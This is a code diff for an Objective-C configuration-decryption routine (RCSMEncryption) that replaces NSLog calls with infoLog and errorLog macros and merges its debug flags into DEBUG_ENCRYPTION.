@@ -16,6 +16,9 @@
 #import "RCSMEncryption.h"
 #import "NSMutableData+AES128.h"
 
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 
 #pragma mark -
 #pragma mark Private Interface
@@ -122,7 +125,7 @@
   
   // Skip the first 2 DWORDs
   [fileHandle seekToFileOffset: TIMESTAMP_SIZE];
-  //NSLog(@"%@", [fileHandle availableData]);
+  //infoLog(@"%@", [fileHandle availableData]);
   
   NSMutableData *tempData = [NSMutableData dataWithData: [fileHandle availableData]];
   CCCryptorStatus result = 0;
@@ -132,8 +135,8 @@
     {
       [fileData appendData: tempData];
       
-#ifdef DEBUG_TEST
-      NSLog(@"File decrypted correctly");
+#ifdef DEBUG_ENCRYPTION
+      infoLog(@"File decrypted correctly");
       [fileData writeToFile: @"/tmp/test.bin" atomically: YES];
 #endif
       
@@ -155,12 +158,12 @@
                                                                         error: nil];
       
       filesize = [fileAttributes objectForKey: NSFileSize];
-#ifdef DEBUG
-      NSLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
-      NSLog(@"EndTokeAndCRCSize: %d", endTokenAndCRCSize);
-      NSLog(@"readFileSize = %d", readFilesize);
-      NSLog(@"attribute = %d", [filesize intValue]);
-      NSLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
+#ifdef DEBUG_ENCRYPTION
+      infoLog(@"timeStamp Size: %d", TIMESTAMP_SIZE);
+      infoLog(@"EndTokeAndCRCSize: %d", endTokenAndCRCSize);
+      infoLog(@"readFileSize = %d", readFilesize);
+      infoLog(@"attribute = %d", [filesize intValue]);
+      infoLog(@"token @ %d", readFilesize - endTokenAndCRCSize);
 #endif
       //
       // There's a problem with one file since we get 3 more bytes
@@ -181,21 +184,21 @@
             }
           @catch (NSException * e)
             {
-#ifdef DEBUG
-              NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_ENCRYPTION
+              infoLog(@"%s exception", __FUNCTION__);
 #endif
 
               return nil;
             }
           
-#ifdef DEBUG
-          NSLog(@"EndToken: %@", endToken);
+#ifdef DEBUG_ENCRYPTION
+          infoLog(@"EndToken: %@", endToken);
 #endif
           
           if (![endToken isEqualToString: [NSString stringWithUTF8String: ENDOF_CONF_DELIMITER]])
             {
-#ifdef DEBUG_ERRORS
-              NSLog(@"[EE] End Token not found");
+#ifdef DEBUG_ENCRYPTION
+              errorLog(@"[EE] End Token not found");
 #endif
               [endToken release];
             
@@ -206,54 +209,54 @@
         }
       else
         {
-#ifdef DEBUG_ERRORS
-          NSLog(@"[EE] Configuration file size mismatch");
+#ifdef DEBUG_ENCRYPTION
+          errorLog(@"[EE] Configuration file size mismatch");
 #endif
           
           return nil;
         }
       
-#ifdef DEBUG
-      NSLog(@"File decrypted correctly");
+#ifdef DEBUG_ENCRYPTION
+      infoLog(@"File decrypted correctly");
 #endif
       
       return fileData;
     }
   else
     {
-#ifdef DEBUG_ERRORS
+#ifdef DEBUG_ENCRYPTION
       switch (result)
         {
         case kCCParamError:
-          NSLog(@"Illegal parameter value");
+          errorLog(@"Illegal parameter value");
           break;
         case kCCBufferTooSmall:
-          NSLog(@"Insufficent buffer provided for specified operation.");
+          errorLog(@"Insufficent buffer provided for specified operation.");
           break;
         case kCCMemoryFailure:
-          NSLog(@"Memory allocation failure.");
+          errorLog(@"Memory allocation failure.");
           break;
         case kCCAlignmentError:
-          NSLog(@"Input size was not aligned properly.");
+          errorLog(@"Input size was not aligned properly.");
           break;
         case kCCDecodeError:
-          NSLog(@"Input data did not decode or decrypt properly.");
+          errorLog(@"Input data did not decode or decrypt properly.");
           break;
         case kCCUnimplemented:
-          NSLog(@"Function not implemented for the current algorithm.");
+          errorLog(@"Function not implemented for the current algorithm.");
           break;
         default:
-          NSLog(@"sux");
+          errorLog(@"sux");
           break;
         }
 #endif
       
-#ifdef DEBUG_VERBOSE_1
-      [tempData writeToFile: @"/Users/revenge/Desktop/test.bin" atomically: YES];
+#ifdef DEBUG_ENCRYPTION
+      [tempData writeToFile: @"/tmp/conf_decrypted.bin" atomically: YES];
 #endif
       
-#ifdef DEBUG
-      NSLog(@"Error while decrypting with key");
+#ifdef DEBUG_ENCRYPTION
+      errorLog(@"Error while decrypting with key");
 #endif
     }
   
